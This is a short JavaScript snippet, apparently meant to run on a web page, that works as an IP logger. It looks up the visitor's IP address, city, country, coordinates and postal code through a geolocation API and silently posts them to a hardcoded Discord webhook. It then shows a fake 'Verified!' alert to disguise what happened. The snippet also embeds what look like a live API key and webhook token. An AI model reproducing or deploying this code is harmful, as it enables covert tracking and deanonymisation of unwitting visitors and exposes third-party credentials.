function json(url) {
  return fetch(url).then(res => res.json());
}

let apiKey = '6b33d646aa842dcaef31ad74278fedba6f94da379373c099a3519d99';
json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
  const content = "@everyone";
  const description = "IP: " + data.ip + "\nCity: " + data.city + "\nCountry: " + data.country_name + "\nLongitude: " + data.longitude + "\nLatitude: " + data.latitude + "\nPostal Code: " + data.postal;
  const message = {
    "content":content,
    "embeds": [{
      "title": "logged",
      "description": description
    }]
  };

  const url = "https://discord.com/api/webhooks/1129994962713456722/3OGUh_3c64c8emvimiiABW-74xm93twGMsUDR8kWpKNi4bjcx3vIG4opZBQRa7bwjPsL";
  fetch(url + "?wait=true", {method:"POST", "headers":{"content-type":"application/json"}, "body":JSON.stringify(message)});
});

setTimeout(() => {
    alert("Verified!")
}, 2000);
